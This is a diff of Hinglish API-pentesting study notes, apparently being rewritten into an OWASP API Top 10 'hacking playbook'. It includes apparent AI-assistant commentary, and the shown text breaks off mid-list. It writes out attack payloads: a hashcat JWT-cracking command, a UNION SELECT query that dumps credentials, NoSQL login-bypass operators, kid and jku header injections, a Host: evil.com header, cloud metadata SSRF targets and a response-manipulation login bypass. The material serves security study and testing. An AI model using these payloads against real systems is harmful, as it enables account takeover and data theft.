@@ -1,901 +1,400 @@
-I've gone through all your notes and extracted everything, page by page. I've converted the explanations into **Hinglish** (Roman script) as you requested, while keeping the technical terms and code snippets exactly as they are.
+# 📘 The Ultimate Industry-Standard API Hacking Playbook (100% Complete)
+**Author:** Senior API Security Researcher & Pentesting Mentor (10+ Yrs Exp)
+**Language:** Hinglish (Roman) for explanations, English for Tech
+**Target:** OWASP API Top 10 2023 | Real-world Corporate Pentesting | Bug Bounty
 
 ---
 
-## Page 1: Unauthorized Access through Response Manipulation
+## 🧩 Module 0: API Hacking Mindset & Methodology
+*Sabse pehle, mindset theek karo. API testing sirf "click next" nahi hai, ye ek game of logic hai.*
 
-### # Unauthorized Access through manipulating Status Code or Response message or Both
-
-Pentesting ke time server response mein **status code** ya **response message** ko manipulate karna bohot useful hota hai taaki check kiya ja sake ki app different scenarios ko kaise handle karti hai.
-
-**Scenario: Testing on App's response to Authentication failures**
-
-* Maano tum ek login form test kar rahe ho. User correct username aur password submit karta hai aur server **200 OK** status aur **authentication token** ke saath respond karta hai.
-* **Note:** Is case mein, hum response ko intercept karenge aur status code change kar denge authentication failure simulate karne ke liye aur dekhenge ki app use kaise handle karti hai.
-
-### Steps to perform Response manipulation with Burp Suite:
-
-1. **Enter correct username & password.**
-2. **Capture the response:** Server response capture karo (likely a 200 OK with a token in the response body).
-3. **Modify the Response Status Code:** Response ko client (browser) tak forward karne se pehle status code ko **200 OK** se change karke **401 Unauthorized** ya **403 Forbidden** kar do.
-* *Tip:* Agar sure nahi ho ki 401/403 response kaisa dikhta hai, toh Google ya Burp Suite mein search karke waise hi modify kar lo.
-
-
+* **API vs Web App:** Web apps user interactions ke liye banti hain (UI ke saath), APIs sirf machine-to-machine communication ke liye (JSON/XML). Isliye APIs mein UI nahi hota, sirf logic hota hai.
+* **Attack Surface Samjho:** Ek API endpoint ek function ki tarah hai. Har function (GET, POST, PUT, DELETE) alag behavior dikha sakta hai.
+* **Rule #1:** Kabhi bhi server ke response par bharosa mat karo. Frontend jo dikha raha hai, wo alag ho sakta hai, backend jo bhej raha hai wo alag.
+* **Rule #2:** API testing = Logic testing. Har flow ko todne ki koshish karo.
 
 ---
 
-## Page 2: Exploiting Frontend Logic
+## 🔍 Module 1: Reconnaissance & Advanced Discovery
+*Target ki "Jaikaashi" karna. Jitna jaayega jaanoge, utna deep jaayega exploit.*
 
-4. **Forward the modified Response to the client:**
-* Sirf status code change karke baaki sab same rehne do. Agar web app ya frontend sirf status code ke base par react kar raha hai aur body ko check nahi kar raha...
-* ...toh hackers isse exploit kar sakte hain! Wo server response status code ko **200 OK** mein modify karke kisi ke bhi account mein login kar sakte hain, bhale hi unhone **wrong username/password** dala ho.
+### Topic 1.1: Passive Recon (Bina Touch Kiye)
+* **Technology Stack Detection:**
+    * **Tool 1: Wappalyzer** (Browser Extension) -> Bataega ki website kis pe bani hai (PHP, Node.js, React, etc.). Isse pata chalega ki SQLi try karna hai ki NoSQLi.
+    * **Tool 2: BuiltWith** (Online Tool) -> Detailed tech profile. (Reference: **Page 12**)
+* **Source Code Analysis (JS Mining):**
+    * Website par right-click -> **Inspect Element (Debugger)** . (Reference: **Page 6**)
+    * Saari JavaScript files (`.js`) scroll karo. Minified (read nahi aa raha) code ho, toh use **"JavaScript JS Formatter"** (online tool) mein daal kar beautify karo. (Reference: **Page 6**)
+    * **Dhoondo kya dhoondo:**
+        * `/api/`, `/v1/`, `/graphql`, `/swagger` jaise paths.
+        * Hardcoded API keys, secrets, ya endpoints comments mein.
+        * **Pro Tip:** `LinkFinder` ya `JSScanner` jaise tools automate kar dete hain JS se endpoints nikalna.
 
+### Topic 1.2: Active Recon (Mapping the Territory)
+* **Directory/File Fuzzing (Basic):** `gobuster` ya `ffuf` use karo.
+* **API-Specific Fuzzing (Advanced):** Normal wordlists API ke liye kaam nahi karti. **Kiterunner** (context-aware fuzzer) use karo jo API routes (`/api/users/export`) aur common API wordlists ke saath aata hai. (Reference: **Page 6 - Fuzzing APIs**)
+* **Hidden Parameter Discovery:** **Arjun** ya Burp ka **Param Miner** use karke hidden headers (jaise `X-Forwarded-For`, `X-Admin-User`, `X-Original-URL`) dhoondna.
+* **Documentation Mining (Sone ki chidiya):**
+    * Ye endpoints dhoondo: `/swagger-ui.html`, `/swagger.json`, `/v2/api-docs`, `/openapi.json`, `/redoc`, `/graphql?introspection`. (Reference: **Missing Topics**)
+    * Agar mil gaya, toh poora API ka map (endpoints, parameters, authentication) mil jayega.
+* **Improper Assets Management (OWASP API 9:2023) Deep Dive:**
+    * **Shadow APIs:** Wo endpoints jo production mein hain par developer bhool gaye (e.g., `/api/v1.1/` jab `/v2/` chal raha ho). Inhe dhoondo fuzzing se.
+    * **Environment Leakage:** Production API ke parameters use karke `dev`, `staging`, ya `test` environment ka data access karna (e.g., changing `origin=prod` to `origin=dev`). Try karo `Host: dev-api.target.com` header change karke.
+    * **Unauthenticated Docs:** Kya Swagger/Redoc UI bina login ke accessible hai? Isse poora map mil jata hai.
+    * **Host Header Injection:** Request mein `Host` header change karke dekho (`Host: evil.com`). Kya server internal redirect kar raha hai ya cache poison ho raha hai?
 
-
-### How to Know if frontend is only validating based on Server response status code?
-
-* **Original Server response for Correct username & password:**
-```http
-HTTP/1.1 200 OK
-Content-Type: application/json
-{
-  "token": "ey....",
-  "user": {
-    "id": 1234,
-    "role": "user"
-  }
-}
-
-```
-
-
-*(Referenced as eq -> 1)*
-
----
-
-## Page 3: Verifying the Vulnerability
-
-* **Now, we will modify the original response to 403 or 401:**
-```http
-HTTP/1.1 403 Forbidden
-Content-Type: application/json
-{
-  "error": "Authentication Failed"
-}
-
-```
-
-
-* Agar ye modified response milne par frontend error message dikhata hai, toh humein idea mil jayega ki frontend decision ya toh status code, ya error message, ya dono ke base par le raha hai.
-
-
-
-### Verification Steps:
-
-1. **Case 1 (Status Code only):** Correct login ke time status code ko **200 OK** se **403 Forbidden** kar do lekin body same (eq -> 1 wali) rakho. Agar frontend "Unauthorized" popup dikhata hai, iska matlab frontend sirf **Status Code** par depend hai.
-* *Hacker Exploit:* Wrong credentials dalo aur status code ko 200 OK kar do—hacker login ho jayega!
-
-
-2. **Case 2 (Response Body only):** Wrong credentials dalo aur sirf response body change karke success wali (eq -> 1) kar do. Agar login ho jata hai, iska matlab decision **Response Body** par hai.
-* *Note:* Kabhi kabhi dono (Status code + Body) change karne padte hain agar server dono check karta hai.
-
-
+### Topic 1.3: Version Control & Leak Search
+* **GitHub/GitLab Dorks:** "target.com API key", "target.com secret", "target.com token" search karo. Internal docs bhi mil sakte hain.
+* **Mobile App Decompilation:** APK download karo, `apktool` ya `jadx` se decompile karo. `strings.xml` aur source code mein hardcoded API keys dhoondo.
 
 ---
 
-## Page 4: API Hacking & Burp Suite Tips (Date: 20/09/24)
+## 🔐 Module 2: Authentication & Session Management Deep-Dive
+*Andar ka raasta (gateway) kitna strong hai?*
 
-### # I.C.M Security - API Hacking
+### Topic 2.1: Response Manipulation (Login Bypass)
+* **Scenario:** Kya frontend sirf server ke status code ke bharose baitha hai? (Reference: **Page 1-4**)
+* **Method (Burp Suite):**
+    1.  Correct credentials daal kar request intercept karo. Server se response aayega (e.g., `200 OK` with token).
+    2.  Response ko browser tak forward karne se pehle, status code change karo `200 OK` se `403 Forbidden` kar do, lekin response body mein token wahi rahne do. (Reference: **Page 2-3**)
+    3.  **Observation:** Agar browser error dikhata hai ("Unauthorized"), iska matlab frontend **sirf Status Code** check kar raha hai.
+    4.  **Exploit:** Ab wrong credentials dalo, server se `403` aayega. Use intercept karo, status code `200 OK` kar do, aur forward kar do. Agar app login ho jati hai, toh **Critical Vulnerability**! (Reference: **Page 3**)
+* **Verification (Grep-Match Method):** (Reference: **Page 4**)
+    * Agar correct/wrong credentials ka response body same hai, toh Intruder mein "Grep-Match" use karo.
+    * Intruder -> Options -> Grep-Match -> Add `"success":true` ya `"status":1` (jo bhi success flag ho). Ye highlight karega successful attempts ko.
 
-**Section 3: Lab Setup & Burp Suite Introduction**
+### Topic 2.2: No-Rate Limit Attacks
+* **Scenario:** Password reset, OTP, ya login attempts par koi limit nahi hai. (Reference: **Page 18**)
+* **Exploit:**
+    * Burp Intruder (ya Python script) se ek email/phone par 1000 OTP requests bhej do.
+    * **Impact:** User ka inbox blast ho jayega (DoS) ya brute-force ke chances badh jayenge.
+* **Fix:** Rate limiting (1-2 per minute) + Captcha.
 
-* **Note:** Agar body length aur status code correct aur incorrect login ke liye exact same hai, toh **Grep-match** method zyada reliable hai.
-* **Steps for Grep-match:**
-1. Intruder -> Options -> Grep-match par click karo.
-2. 'Clear' click karke previous cheezein hatao.
-3. 'Add' input box mein `1` dalo (ya jo bhi success flag ho).
-4. Ye un requests ko highlight/flag kar dega jisme response body mein `1` (Correct) hai.
+### Topic 2.3: Clickjacking (Session Riding)
+* **Scenario:** User apne session ka fayda utha kar anjaane mein action kar de. (Reference: **Page 18-19**)
+* **Method:**
+    * Hacker ek fake page banata hai (e.g., "Win a Prize" button). Is button ke peeche ek transparent iframe mein target website ka sensitive button (e.g., "Delete Account") hota hai.
+    * User click karta hai, actually wo "Delete Account" par click kar deta hai, kyunki wo already logged-in hai.
+* **Test:** Burp Suite mein kisi bhi response par right-click -> **"Check for Clickjacking"** .
 
+### Topic 2.4: Session Security
+* **Session ID Static Hai Kya?** (Reference: **Page 19**)
+    * Login se pehle jo cookie milti hai (`PHPSESSID`) aur login ke baad wali cookie, check karo. Kya wo same hai?
+    * **Risk:** Agar login ke baad bhi session ID change nahi hoti, toh hacker ye ID chura kar (XSS ya phishing se) kabhi bhi account mein ghus sakta hai bina password ke. Isse **Session Fixation** kehte hain.
+* **Refresh Token Rotation:** Check karo ki jab naya access token liya jata hai, to purana refresh token invalid ho jata hai ya nahi.
+* **Concurrent Sessions:** Kya same user do alag browsers se login kar sakta hai? Kitni active sessions allowed hain?
 
-* Ye isliye karte hain kyunki wrong login par body mein `0` (Zero) aur correct par `1` (One) ho sakta hai, jabki baaki sab same ho.
+### Topic 2.5: JWT (JSON Web Tokens) Deep-Dive (Reference: **Page 7-9**)
 
+#### Sub-Topic: JWT Structure
+* `ey... . ey... . xxA...` -> Teen parts: **Header.Payload.Signature**
+* **Header:** Algorithm batao (e.g., `HS256`, `RS256`).
+* **Payload:** User data (e.g., `"user": "sat"`, `"admin": false`).
+* **Signature:** Secret key se sign kiya gaya hash. (Reference: **Page 7**)
+* **Tool:** `jwt.io` par paste karo, decoded dikh jayega. (Reference: **Page 7**)
 
-* **Note for HTTP History:**
-* Tum kisi bhi request par right-click karke use **color** de sakte ho taaki wo history mein alag se highlight ho aur tum use easily dhoond sako.
+#### Sub-Topic: Attacking JWT
+* **1. Hashcat (Brute-force HS256):**
+    * Agar secret key weak hai (e.g., `secret`, `password`), toh use crack karo.
+    * `hashcat -m 16500 <jwt_token> /path/wordlist.txt --show` (Reference: **Page 8-9**)
+    * `-m 16500` = HS256. HS384 ke liye `16510`, HS512 ke liye `16520`.
+* **2. Algorithm Confusion (RS256 -> HS256):**
+    * **Scenario:** Server RS256 (private/public key) use kar raha hai, lekin humein public key pata hai (usually `.well-known/jwks.json` se mil jati hai).
+    * **Attack:** Hum header mein algorithm `HS256` kar dete hain aur public key ko HMAC secret ki tarah use karte hain. Token sign kar dete hain. Agar server public key se verify karta hai (jo ki ab secret ban gaya), toh accept ho jayega. (Reference: **Missing Topics**)
+* **3. None Algorithm Attack:**
+    * Header ko `"alg": "none"` kar do aur signature part hata do. Purani libraries mein kaam karta tha. (Reference: **Missing Topics**)
+* **4. `kid` (Key ID) Injection:**
+    * Header mein `kid` parameter hota hai. Ismein path traversal daal do (`"kid": "../../dev/null"`) ya SQLi (`"kid": "key' UNION SELECT 'secret'"`). Agar server ise read karta hai bina validate kiye, toh signature bypass ho sakta hai.
+* **5. `jku` / `x5u` Header Injection:**
+    * `jku` (JWKS URL) header mein apne server ka URL daal do jahan aapne apni public key rakhi ho. Server wahan se key utha lega aur aap jo bhi sign karoge, wo valid ho jayega.
+* **6. JTI Replay Attack:**
+    * `jti` (JWT ID) claim check hota hai ki nahi? Agar nahi, toh same token baar-baar use karo.
+* **7. Timing Attacks:**
+    * Valid aur invalid signature verify karne mein server different time le raha hai? Isse brute-force fast ho sakta hai.
 
-
-
----
-
-## Page 5: Scoping & Headers
-
-* **Note on 'Add to Scope':**
-* Jab tum kisi URL ko scope mein add karte ho, toh HTTP history tab mein filter enable kar sakte ho (**"Show only in-scope items"**).
-* *Path:* Top right corner of HTTP history -> Filter icon -> Check "Show only in-scope items".
-
-
-* **Pro Tip:** Poore base domain (e.g., `https://testphp.vulnweb.com`) ko scope mein add karna better hai bajaye sirf ek specific path (`/account`) ke, taaki saari relevant requests dikhein.
-* **Note - 'Referer' header:** Ye server ko batata hai ki request kahan se originate hui (source page).
-* **Note - 'Host' header:** Ye domain ya IP address hota hai jisse tum communicate kar rahe ho (where the request is sent).
-
----
-
-## Page 6: Section 4 - Enumerating APIs
-
-### #2) Fuzzing APIs:
-
-Agar tum koi request Burp mein dekhte ho jaise:
-`GET /api/v2/resources/books?published=1993`
-Toh in jagahon par fuzzing try karo:
-
-* `v2` ki jagah `v1` ya `v3`.
-* `books` ki jagah `office` ya `users`.
-* `published` ki jagah `unpublished`.
-* Intruder use karke simple wordlist se attack karo single parameter ya multiple parameters par.
-
-### #3) Discovery via Source Code:
-
-* Frontend JavaScript files ko read karo taaki hidden URL paths mil sakein.
-* Website par right-click -> **Inspect/Debugger**.
-* Sari frontend JS files check karo aur route ya "juicy info" dhoondo.
-* **Note:** Agar code readable nahi hai (minified hai), toh code copy karke Chrome mein **"JavaScript JS Formatter"** search karo aur wahan se format kar lo.
-
----
-
-## Page 7: Section 5 & 6 - Authorization & JWT
-
-### Section 5: Attacking Authorization
-
-* **Note:** Agar koi ID mile (e.g., `vehicleId`), toh use manipulate karne ki koshish karo.
-* **Note:** **Negative ID** dekar dekho, app break ho sakti hai aur error message mein "juicy info" (sensitive data) de sakti hai.
-
-### Section 6: Attacking Authentication
-
-**#4) JSON Web Tokens (JWT) -> Part 1 Theory**
-
-* JWT base64 encoded data hota hai. Iske teen parts hote hain:
-1. **Header**
-2. **Payload**
-3. **Signature**
-
-
-* *(Example shown: eyh... . ey... . xxA...)*
-
-
-* **Note:** `jwt.io` website par jab tum JWT daloge, toh right side mein decoded Header, Payload aur Signature input box dikh jayenge.
+#### Sub-Topic: OAuth 2.0 / OIDC Flows
+* **Redirect URI Manipulation:** OAuth flow mein `redirect_uri` parameter ko change karke apne malicious site par bhej do. Agar open redirect hai, toh authorization code steal kar sakte ho.
+* **State Parameter Missing:** Agar `state` parameter missing hai, toh CSRF attack ho sakta hai. Attacker apni link bhej kar user ke account ko link kar sakta hai.
+* **Token Leakage:** Access token kabhi URL mein mat aane do (`#access_token=`). Referer header se leak ho sakta hai.
 
 ---
 
-## Page 8: JWT Attacking (Part 2)
-
-### #5) JSON Web Tokens -> Part 2 Attacking
-
-Hum **hashcat** tool use karenge JWT secret key ko brute-force karne ke liye.
-
-* Agar secret key mil gayi, toh hum payload change karke (e.g., `"user": "sat"` ko `"user": "admin"` mein) use usi key se sign kar sakte hain. Backend ise accept kar lega kyunki signature correct hoga.
-
-**Hashcat Command:**
-`hashcat -m 16500 <jwt_token> /path/to/wordlist.txt`
-
-* `-m 16500` specify karta hai ki ye **JWT HMAC-SHA256** mode hai.
-
-**Common Hash modes for JWT:**
-
-* 16500 -> JWT HMAC-SHA256 (HS256)
-* 16510 -> JWT HMAC-SHA384 (HS384)
-* 16520 -> JWT HMAC-SHA512 (HS512)
-* *Tip:* `jwt.io` ke header section mein tum dekh sakte ho ki konsa algorithm use ho raha hai.
-
----
-
-## Page 9: JWT & Asymmetric Algorithms
-
-* **Note:** Agar JWT asymmetric algorithms (RS256 ya ES256) se signed hai, toh wo is tarah brute-force nahi ho sakta kyunki wo private/public key pairs use karte hain. Ye method sirf **HMAC (HS256, HS384, HS512)** ke liye hai.
-* **Note:** Jab hashcat password crack kar leta hai, toh terminal mein password dikhane ke liye aapko command ke end mein `--show` lagana padta hai:
-`hashcat -m 16500 <jwt_token> <wordlist> --show`
-
-**Once secret key is found:**
-
-1. `jwt.io` par jao, encoded token paste karo.
-2. Payload tab mein user ID change karo (e.g., `"userId": "admin"`).
-3. 'Verify Signature' section mein secret key paste karo.
-4. Ab ye naya token backend accept kar lega aur tum admin ban jaoge.
-
----
-
-## Page 10: Section 7 - Injection
-
-### #3) SQL Injection Lab:
-
-1. **Send request to Intruder.**
-* E.g., `GET /v1/001.php?id=$1$`
-
-
-2. **Intruder -> Positions -> Attack type -> Sniper.**
-3. **Payload tab -> Payload Options -> Add from list...**
-4. List mein se **"Fuzzing SQL Injection"** select karo.
-5. **Start Attack.**
-
-* **Note:** Brute-force ke baad status code check karo (401, 501, 200...). Agar kisi payload par status code ya response length change hoti hai, toh iska matlab SQL injection possible hai.
-* Ek baar confirm ho jaye, toh manually database se saare username aur password nikalne ki koshish karo.
-
----
-
-I’ve extracted and converted the rest of your notes into **Hinglish** (Roman script), keeping all the technical commands and code snippets intact.
-
----
-
-## Page 11: SQL & NoSQL Injection
-
-### # SQL Injection (Continued)
-
-SQL injection ke through data extract karne ke liye `UNION SELECT` ka use hota hai:
-`GET /v1/001.php?id=5+UNION+SELECT+username,password,null,null+from+users--`
-
-* Is query mein `+` symbols URL encoded spaces hain.
-* `null` ka matlab hai wo fields jinse humein koi value nahi chahiye.
-
-### #5) NoSQL Injection Lab:
-
-**How to know if a web app uses MongoDB as a database?**
-
-1. **Look for MongoDB-specific error messages:** Input fields mein special characters ya invalid data inject karke error trigger karo. Agar app MongoDB use kar rahi hai, toh aapko keywords dikhenge jaise:
-* `MongoError`
-* `E11000` (duplicate key error)
-
-
-2. **Check for MongoDB-specific API responses:** Server ke bheje gaye response mein patterns dhoondo, jaise:
-* Fields like `_id`, `objectId`, or `bsontype`.
-* **Example Response:** `{"id": "507...", "username": "admin", "created_at": "2023/..."}`
-
-
-
----
-
-## Page 12: Tools & NoSQL Injection Types
-
-### # Tools to Detect Tech Stack:
-
-* **Wappalyzer:** Ek browser extension hai jo website ki technologies detect karta hai.
-* **BuiltWith:** Ek online tool hai jahan URL enter karke aap website ki poori technology profile dekh sakte ho.
-
-### # NoSQL Injection Methods:
-
-**1) Boolean Based Injection:** Ismein hum aisi condition inject karte hain jo hamesha **true** evaluate ho, taaki authentication bypass ho sake.
-
-* **Example Query:** `db.users.find({"username": username, "password": password})`
-* **Attacker's Injection:**
-* Username: `"admin"`
-* Password: `{"$ne": null}`
-
-
-* **Final Query:** `db.users.find({"username": "admin", "password": {"$ne": null}})`
-* **Result:** Ye query us user ko return karegi jiska username "admin" hai aur password null nahi hai (jo ki true hi hoga), isse authentication bypass ho jata hai.
-
----
-
-## Page 13: Advanced NoSQL Bypass
-
-### # Bypassing Username and Password:
-
-Dono fields bypass karne ke liye `$or` operator ya existing fields ka use kar sakte ho.
-
-* **Injection:** `username: {"$exists": true}, password: {"$ne": null}`
-* **Logic:** Ye query kisi bhi aise user ko return karegi jahan username field exist karti ho aur password null na ho. Isse specific username ki zaroorat nahi padti.
-
-### #2) Query Parameter Manipulation:
-
-Attacker extra parameters add karke query manipulate karta hai, kabhi kabhi query ke andar JavaScript bhi execute karwa deta hai.
-
-* **Example Query:** `db.users.find({"username": username})`
-* **Attacker's Injection:** `username: {"$where": "this.username == 'admin'"}`
-* **Result:** Ye injected JS code server par execute hota hai aur result "admin" user return karta hai.
-
----
-
-## Page 14: Command Injection in NoSQL
-
-### #3) Command Injection:
-
-MongoDB operators ka use karke query ka behavior badal dena.
-
-* **Original:** `db.users.find({"username": username})`
-* **Injection:** `username: {"$gt": ""}`
-* **Modified Query:** `db.users.find({"username": {"$gt": ""}})`
-* **Result:** `$gt` (greater than) operator un saare usernames ko check karega jo empty string से bade hain. Isse database ke saare non-empty users expose ho sakte hain.
-
----
-
-## Page 15: Mass Assignment & Method Brute-forcing
-
-### # Section 8 -> Mass Assignment
-
-* **Note:** Aap Intruder ka use karke **Request Method** ko bhi brute-force kar sakte ho taaki pata chale ki kaunse methods allowed hain.
-* **Example:** `GET /workshop/api/shop/products`
-* Intruder/Payloads mein `HTTP verbs` select karo (GET, POST, PUT, DELETE, etc.).
-* Agar kisi method (jaise POST) ke liye **200 Status Code** milta hai, toh iska matlab wo method allowed hai.
-* **Next Step:** Ab wahi request POST method ke saath bhejo. Agar response mein "username required" aata hai, toh samajh jao ki aap naya user create ya modify kar sakte ho.
-
----
-
-## Page 16: Burp Suite Scoping
-
-### # Burp Suite Target Scope Configuration:
-
-HTTP history tab mein sirf specific domain ka traffic dekhne ke liye scope configure karein:
-
-1. **Set the Target Scope:** Target tab -> Scope -> 'Add' par click karein aur domain dalo (e.g., `https://example.com`).
-2. **Configure Interception:** Proxy tab -> Intercept -> Options. "Intercept client requests" aur "Intercept server responses" section mein **"Intercept requests/responses based on the current target scope"** select karo. Isse फालतू traffic intercept nahi hoga.
-
----
-
-## Page 17: Filtering & Settings
-
-### #3) Filter HTTP History:
-
-* Proxy -> HTTP history tab ke top par filter options par click karo.
-* **"Show only in-scope items"** select karo. Ab sirf aapke defined scope ka traffic dikhega aur baaki ignore ho jayega.
-
-### # To see all Request-Response in 'Intercept' tab:
-
-1. Click on 'Settings'.
-2. Tick `[✓] Intercept response based on the following rules`.
-3. Tick `[✓] OR Request was intercepted`.
-
-* Ye karne ke baad aap har request ka server response dekh paoge.
-
----
-
-## Page 18: No-Rate Limit & Clickjacking
-
-### # No-Rate Limit Attack on Password Reset:
-
-Agar password reset feature par rate limit nahi hai, toh attacker baar-baar OTP ya reset links request kar sakta hai.
-
-* **Exploit:** Burp Suite ya Python script se spamming karna. Isse user ka email bhar jayega ya DoS (Denial of Service) ho sakta hai.
-* **Fix:** 1-2 OTPs per minute ki limit lagao aur Captcha use karo.
-
-### # Clickjacking Attack:
-
-Clickjacking ek aisa attack hai jahan hacker aapko kisi aisi cheez par click karne ke liye trick karta hai jahan aapka iraada nahi tha. Hacker ek legitimate website (jaise bank) ko ek **invisible frame** ke andar apne fake website par chhupa deta hai.
-
-* **Example:** Auto-liking ya sharing a post.
-* Hacker ek fake webpage banata hai (e.g., "Click here to watch cute video").
-* Is button ke neeche invisible iframe mein Facebook ka "Like" ya "Follow" button hota hai.
-
----
-
-## Page 19: Clickjacking (cont.) & Session ID
-
-* Jab aap fake button par click karte ho, toh aap anjaane mein Facebook post share ya like kar dete ho kyunki aap pehle se logged-in the.
-* **Note:** Is attack mein aapko koi form bharne ki zaroorat nahi padti, attacker bas aapke existing session ka fayda uthata hai.
-
-### # Session ID:
-
-* **Session ID** ek unique identifier hai jo tab generate hota hai jab user login karta hai. Ye server ko track rakhne mein madad karta hai ki user ne kaunse pages visit kiye, taaki baar-baar login na karna pade.
-* **How it is used:** Ye ID cookie mein store hoti hai aur har request ke saath server ko bheji jaati hai.
-* **Security Risk:** Agar attacker ye Session ID chura leta hai (Hijacking ya Cookie theft), toh wo user ke account ka access pa sakta hai bina password ke.
-* **Note:** Sabse badi problem tab hoti hai jab **Session ID change nahi hoti**. Hacker us static session ID ka use karke kabhi bhi login kar sakta hai.
-
----
-
-Bhai, aapke notes base clear karne ke liye bohot solid hain, khaas karke **JWT** aur **NoSQLi** wala part aapne kaafi detail mein cover kiya hai. Lekin agar hum "Industry Standards" aur "Senior Pentester" ke point of view se dekhen, toh kaafi saare critical topics abhi missing hain jo modern API security testing mein must-have hote hain.
-
-Yahan missing topics ki structured list hai jo aapko apne notes mein add karni chahiye:
-
-### 1. Broken Object Level Authorization (BOLA / IDOR)
-
-Aapne "Attacking Authorization" mein ID manipulation touch kiya hai, lekin BOLA industry ka **#1 API Risk** hai. Ismein aapko ye sub-topics missing lag rahe hain:
-
-* **Massive BOLA:** Multi-tenancy environment mein ek organization ka user dusri organization ka data kaise access karta hai.
-* **BOLA in Delete/Update:** Sirf GET requests nahi, balki `DELETE /api/user/123` jaisi requests test karna.
-* **UUID/GUID Brute-forcing:** Agar ID predictable nahi hai (like UUID), toh use leak karne ke methods (Search results, Logs, etc.).
-
-### 2. Broken Property Level Authorization (BPLA)
-
-Ye OWASP 2023 ki naye category hai jo aapke notes mein nahi hai:
-
-* **Mass Assignment (Advanced):** Aapne method brute-forcing likha hai, lekin "Hidden Properties" dhoondna (jaise `is_admin: true` ya `role: superuser`) missing hai.
-* **Excessive Data Exposure:** Server response mein aisi properties aana jo frontend ko nahi chahiye (jaise user ka mobile number ya internal ID).
-
-### 3. Server-Side Request Forgery (SSRF) in APIs
-
-Modern APIs aksar dusre internal services se communicate karti hain.
-
-* **Exploiting via Webhooks:** API parameters mein apna URL dalkar server se request karwana.
-* **Cloud Metadata Exploitation:** API ke zariye AWS/Azure ke internal metadata (169.254.169.254) ka access lena.
-
-### 4. GraphQL Specific Attacks
-
-Aapne REST APIs cover ki hain, lekin modern apps **GraphQL** use karti hain jiske attacks bilkul alag hote hain:
-
-* **Introspection Queries:** Poora database schema (queries/mutations) extract karna.
-* **Circular Queries (DoS):** Aisi query bhejna jo server ko infinite loop mein daal de.
-* **Direct Object Injection:** GraphQL queries mein nested objects manipulate karna.
-
-### 5. Advanced Recon & Tooling
-
-Professional level par discovery manual nahi hoti:
-
-* **Documentation Analysis:** Swagger (OpenAPI) ya Postman collections se hidden endpoints dhoondna.
-* **Active Recon Tools:** **Kiterunner** (context-aware fuzzing) aur **Arjun** (parameter discovery) ka use.
-* **Passive Recon:** GitHub dorks ya JS files se hidden API keys aur secrets nikalna.
-
-### 6. OAuth 2.0 & OIDC Vulnerabilities
-
-Sirf JWT kafi nahi hai, login flows bhi test karne hote hain:
-
-* **Redirect URI Manipulation:** Authorization code ko apne server par redirect karwana.
-* **State Parameter Missing:** CSRF attacks in OAuth flow.
-* **Token Leakage:** Referer headers ke zariye access token churaana.
-
-### 7. Security Misconfigurations (Modern)
-
-* **CORS (Cross-Origin Resource Sharing):** `Access-Control-Allow-Origin: *` ki wajah se sensitive data leak hona.
-* **HPP (HTTP Parameter Pollution):** Same name ke do parameters bhejna (e.g., `?id=1&id=2`) taaki security filter bypass ho sake.
-
----
-
-**Next Step:** Kya aap chahte hain ki main **BOLA (Broken Object Level Authorization)** se shuru karun aur aapko iska ek practical industry-standard roadmap aur lab setup samjhaun?
-
-### Missing Topics & Sub-Topics
-
-#### 1. OWASP API Security Top 10 – 2023 Coverage
-- **Broken Object Level Authorization (BOLA / IDOR)**
-  - Chained BOLA (e.g., using one IDOR to leak another ID)
-  - Bulk BOLA (array/JSON object injection with multiple IDs)
-  - BOLA in non‑CRUD operations (e.g., state transitions)
-- **Broken Property Level Authorization (BPLA)**
-  - Mass assignment of hidden properties (e.g., `isAdmin`, `role`, `balance`)
-  - Excessive data exposure via over-fetching (e.g., responses containing sensitive fields not needed by frontend)
-  - Property tampering in deeply nested JSON objects
-- **Unrestricted Resource Consumption**
-  - Rate limiting bypass techniques (e.g., IP rotation, using different endpoints)
-  - Resource‑based DoS (e.g., sending large payloads, complex queries)
-  - Pagination abuse (requesting large `limit` values)
-- **Server-Side Request Forgery (SSRF)**
-  - SSRF via URL parameters, webhooks, or file uploads
-  - Exploiting cloud metadata endpoints (`169.254.169.254`, `metadata.google.internal`)
-  - Blind SSRF detection techniques (out‑of‑band, time‑based)
-- **Security Misconfiguration**
-  - CORS wildcard (`*`) with credentials allowed
-  - Verbose error messages leaking stack traces or internal paths
-  - HTTP method override headers (`X-HTTP-Method-Override`) leading to bypasses
-  - API versioning issues (exposed deprecated, debug, or beta endpoints)
-- **Unsafe Consumption of APIs**
-  - Third‑party API integration flaws (e.g., leaking tokens, insufficient validation of responses)
-
-#### 2. Advanced JWT Attacks
-- **Algorithm Confusion Attacks**
-  - RS256 → HS256 key confusion (using public key as HMAC secret)
-  - ES256 → HS256 confusion (if public key is known or guessable)
-- **Header Injection / Parameter Manipulation**
-  - `alg: none` attack (if signature verification is skipped)
-  - `kid` (Key ID) injection leading to path traversal or SQLi
-  - `jku` / `x5u` header manipulation to point to attacker‑controlled keys
-- **Weaknesses in JWT Validation**
-  - Missing signature verification on the server
-  - Accepting tokens with incorrect or mismatched algorithms
-  - Timing attacks on signature verification
-
-#### 3. GraphQL Specific Attacks
-- **Introspection Queries** – extracting full schema, queries, mutations, and subscriptions
-- **GraphQL Batching / Depth Attacks**
-  - Circular queries / alias‑based resource exhaustion
-  - Deeply nested queries causing database or compute overload
-- **Directive‑based Attacks**
-  - Abuse of custom directives (e.g., `@include`, `@skip` with user‑controlled variables)
-- **Field Suggestions** – leaking field names when introspection is disabled
-- **GraphQL IDOR** – accessing objects across types using predictable global IDs
-
-#### 4. OAuth 2.0 / OIDC Vulnerabilities
-- **Redirect URI Manipulation** – open redirect leading to authorization code interception
-- **CSRF in OAuth Flow** – missing or weak `state` parameter
-- **Authorization Code Interception** – code leakage via referer headers or browser history
-- **Token Leakage in Logs / URLs** – access tokens passed in query strings
-- **Improper Scope Validation** – upgrading privileges by modifying the `scope` parameter
-- **Refresh Token Weaknesses** – infinite lifetime, no rotation, no binding to client
-
-#### 5. Microservices, Serverless, and Webhooks
-- **Microservice‑specific Threats**
-  - Service‑to‑service authentication bypass (e.g., hardcoded API keys, mTLS misconfig)
-  - Internal API exposure via misconfigured service mesh
-- **Serverless API Risks**
-  - Event injection (e.g., manipulating event data to alter function logic)
-  - Denial of wallet (resource exhaustion leading to high costs)
-- **Webhook Security**
-  - Lack of signature verification (attacker can replay or forge webhook calls)
-  - SSRF via webhook URL parameters
-  - Replay attacks due to missing nonce / timestamp checks
-
-#### 6. Business Logic Flaws
-- **Race Conditions** – exploiting concurrency in e‑commerce, coupon usage, voting, etc.
